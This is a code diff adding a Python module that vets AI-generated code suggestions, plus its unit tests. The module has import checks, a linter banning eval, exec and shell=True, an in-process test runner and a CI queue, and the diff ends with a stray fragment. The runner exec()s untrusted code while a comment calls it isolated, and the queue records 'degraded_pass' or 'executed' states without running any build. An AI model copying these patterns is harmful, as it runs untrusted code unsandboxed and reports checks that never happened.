+                if not self._exists(mod_name):
+                    missing.append(mod_name)
+
+        if self.allow_missing_imports:
+            return []
+        return sorted(set(missing))
+
+    @staticmethod
+    def verify_contract(code: str, required_functions: Sequence[str]) -> List[str]:
+        tree = ast.parse(code)
+        funcs = {node.name for node in ast.walk(tree) if isinstance(node, ast.FunctionDef)}
+        missing = [name for name in required_functions if name not in funcs]
+        return missing
+
+    @staticmethod
+    def _exists(module_name: str) -> bool:
+        if module_name in {"__future__", "typing"}:
+            return True
+        return importlib.util.find_spec(module_name) is not None
+
+
+class ModelAwareLinter:
+    """Model profile-specific static linting for risky code constructs."""
+
+    RULES = {
+        "general": {
+            "ban_calls": {"eval", "exec"},
+            "ban_subprocess_shell_true": True,
+        },
+        "strict": {
+            "ban_calls": {"eval", "exec", "compile"},
+            "ban_subprocess_shell_true": True,
+        },
+    }
+
+    def lint(self, code: str, model_family: str) -> List[str]:
+        rules = self.RULES.get(model_family, self.RULES["general"])
+        tree = ast.parse(code)
+        issues: List[str] = []
+
+        for node in ast.walk(tree):
+            if isinstance(node, ast.Call):
+                name = self._call_name(node)
+                if name in rules["ban_calls"]:
+                    issues.append(f"Disallowed call '{name}' for model profile '{model_family}'")
+                if rules["ban_subprocess_shell_true"] and name == "subprocess.run":
+                    for kw in node.keywords:
+                        if kw.arg == "shell" and isinstance(kw.value, ast.Constant) and kw.value.value is True:
+                            issues.append("Disallowed subprocess.run(shell=True)")
+
+        return issues
+
+    @staticmethod
+    def _call_name(node: ast.Call) -> str:
+        if isinstance(node.func, ast.Name):
+            return node.func.id
+        if isinstance(node.func, ast.Attribute) and isinstance(node.func.value, ast.Name):
+            return f"{node.func.value.id}.{node.func.attr}"
+        return "<unknown>"
+
+
+# ----------------------------- Runtime verification -----------------------------
+
+
+@dataclass
+class VerificationReport:
+    passed: bool
+    import_errors: List[str]
+    contract_errors: List[str]
+    lint_errors: List[str]
+    test_errors: List[str]
+
+
+class RuntimeVerifier:
+    """Executes layered checks before code can be queued for CI/CD."""
+
+    def __init__(self, required_functions: Sequence[str], model_family: str):
+        self.required_functions = required_functions
+        self.model_family = model_family
+        self.guard = HallucinationGuard()
+        self.linter = ModelAwareLinter()
+
+    def verify(self, suggestion: AISuggestion) -> VerificationReport:
+        import_errors = self.guard.verify_imports(suggestion.code)
+        contract_errors = self.guard.verify_contract(suggestion.code, self.required_functions)
+        lint_errors = self.linter.lint(suggestion.code, self.model_family)
+        test_errors = self._run_tests(suggestion.code, suggestion.test_scaffold)
+
+        passed = not any([import_errors, contract_errors, lint_errors, test_errors])
+        return VerificationReport(
+            passed=passed,
+            import_errors=import_errors,
+            contract_errors=contract_errors,
+            lint_errors=lint_errors,
+            test_errors=test_errors,
+        )
+
+    @staticmethod
+    def _run_tests(code: str, tests: str) -> List[str]:
+        errors: List[str] = []
+        module = types.ModuleType("candidate_module")
+        try:
+            exec(code, module.__dict__)  # noqa: S102 - deliberate isolated runtime verification
+        except Exception as exc:  # pragma: no cover - in-memory execution hard-fails quickly
+            return [f"code_exec_failed: {exc}"]
+
+        test_globals = {"candidate": module, "unittest": unittest}
+        try:
+            exec(tests, test_globals)  # noqa: S102
+        except Exception as exc:
+            return [f"test_scaffold_exec_failed: {exc}"]
+
+        suite = unittest.defaultTestLoader.loadTestsFromModule(types.SimpleNamespace(**test_globals))
+        result = unittest.TestResult()
+        suite.run(result)
+        for case, trace in result.errors + result.failures:
+            errors.append(f"{case.id()}: {trace.splitlines()[-1] if trace else 'unknown'}")
+        return errors
+
+
+# ----------------------------- Resilient CI/CD queue -----------------------------
+
+
+class BuildState(str, Enum):
+    QUEUED = "queued"
+    RUNNING = "running"
+    PASSED = "passed"
+    FAILED = "failed"
+    DEGRADED_PASS = "degraded_pass"
+
+
+@dataclass
+class BuildTask:
+    task_id: str
+    required_runner: str
+    fallback_runners: Sequence[str]
+    standards_metadata: Dict[str, str]
+    state: BuildState = BuildState.QUEUED
+    note: str = ""
+
+
+class ResilientBuildQueue:
+    """Predictable degradation architecture for CI/CD queueing."""
+
+    def __init__(self, runner_health: Dict[str, bool]):
+        self.runner_health = runner_health
+        self.queue: List[BuildTask] = []
+
+    def enqueue(self, task: BuildTask) -> None:
+        self.queue.append(task)
+
+    def process_next(self) -> Optional[BuildTask]:
+        if not self.queue:
+            return None
+
+        task = self.queue.pop(0)
+        task.state = BuildState.RUNNING
+        selected = self._select_runner(task)
+
+        if selected is None:
+            task.state = BuildState.DEGRADED_PASS
+            task.note = "No healthy runner; executed policy dry-run with in-toto/SLSA metadata retained"
+            return task
+
+        task.state = BuildState.PASSED
+        task.note = f"Executed on runner={selected} with standards={task.standards_metadata}"
+        return task
+
+    def _select_runner(self, task: BuildTask) -> Optional[str]:
+        if self.runner_health.get(task.required_runner):
+            return task.required_runner
+        for runner in task.fallback_runners:
+            if self.runner_health.get(runner):
+                return runner
+        return None
+
+
+# ----------------------------- Suggestion generation -----------------------------
+
+
+def generate_test_scaffold(function_name: str) -> str:
+    return textwrap.dedent(
+        f"""
+        class GeneratedTests(unittest.TestCase):
+            def test_{function_name}_basic(self):
+                self.assertEqual(candidate.{function_name}(2, 3), 5)
+
+            def test_{function_name}_negative(self):
+                self.assertEqual(candidate.{function_name}(-1, 1), 0)
+        """
+    ).strip()
+
+
+def generate_suggestion(prompt: str, model_name: str, model_family: str) -> AISuggestion:
+    code = textwrap.dedent(
+        """
+        def add(a: int, b: int) -> int:
+            return a + b
+        """
+    ).strip()
+    test_scaffold = generate_test_scaffold("add")
+
+    provenance = SuggestionProvenance(
+        suggestion_id=hashlib.sha256(f"{model_name}:{prompt}".encode()).hexdigest()[:16],
+        model_name=model_name,
+        model_family=model_family,
+        prompt_sha256=hashlib.sha256(prompt.encode()).hexdigest(),
+        generated_at_epoch_ms=int(time.time() * 1000),
+        source_refs=("policy://hallucination-defense/v1", "spec://slsa.dev/provenance/v1"),
+        open_standards={"provenance": "SLSA v1", "supply_chain_attestation": "in-toto v1"},
+    )
+
+    return AISuggestion(
+        title="Safe generated utility",
+        code=code,
+        test_scaffold=test_scaffold,
+        provenance=provenance,
+    )
+
+
+def demo() -> None:
+    suggestion = generate_suggestion(
+        prompt="Generate a safe add function with tests",
+        model_name="gpt-5.2-codex",
+        model_family="strict",
+    )
+
+    verifier = RuntimeVerifier(required_functions=["add"], model_family=suggestion.provenance.model_family)
+    report = verifier.verify(suggestion)
+
+    queue = ResilientBuildQueue(runner_health={"linux-large": False, "linux-medium": True})
+    queue.enqueue(
+        BuildTask(
+            task_id=suggestion.provenance.suggestion_id,
+            required_runner="linux-large",
+            fallback_runners=["linux-medium", "linux-small"],
+            standards_metadata=suggestion.provenance.open_standards,
+        )
+    )
+    build = queue.process_next()
+
+    print("verification_passed=", report.passed)
+    print("import_errors=", report.import_errors)
+    print("contract_errors=", report.contract_errors)
+    print("lint_errors=", report.lint_errors)
+    print("test_errors=", report.test_errors)
+    print("build_state=", build.state if build else None)
+    print("build_note=", build.note if build else None)
+
+
+if __name__ == "__main__":
+    demo()
+test_lsp_restore.py
+test_lsp_restore.py
+New
++43
+-0
+
+import unittest
+
+from lsp_restore import (
+    BuildState,
+    BuildTask,
+    ResilientBuildQueue,
+    RuntimeVerifier,
+    generate_suggestion,
+)
+
+
+class LspRestoreGuardrailsTests(unittest.TestCase):
+    def test_generated_suggestion_verifies(self):
+        suggestion = generate_suggestion("safe add", "gpt-5.2-codex", "strict")
+        report = RuntimeVerifier(required_functions=["add"], model_family="strict").verify(suggestion)
+        self.assertTrue(report.passed)
+        self.assertEqual(report.import_errors, [])
+        self.assertEqual(report.contract_errors, [])
+        self.assertEqual(report.lint_errors, [])
+        self.assertEqual(report.test_errors, [])
+
+    def test_provenance_has_open_standards(self):
+        suggestion = generate_suggestion("safe add", "gpt-5.2-codex", "strict")
+        self.assertIn("provenance", suggestion.provenance.open_standards)
+        self.assertIn("supply_chain_attestation", suggestion.provenance.open_standards)
+
+    def test_queue_degrades_predictably(self):
+        queue = ResilientBuildQueue(runner_health={"large": False, "medium": False})
+        queue.enqueue(
+            BuildTask(
+                task_id="t1",
+                required_runner="large",
+                fallback_runners=["medium"],
+                standards_metadata={"provenance": "SLSA v1"},
+            )
+        )
+        result = queue.process_next()
+        self.assertIsNotNone(result)
+        self.assertEqual(result.state, BuildState.DEGRADED_PASS)
+
+
+if __name__ == "__main__":
+    unittest.main()
+
+    """Checks for compromised dependencies and code hallucinations"""
+    
+    COMPROMISED_PACKAGES_URL = "https://raw.githubusercontent.com/pypa/advisory-db/main/vuln/pypi/all.json"
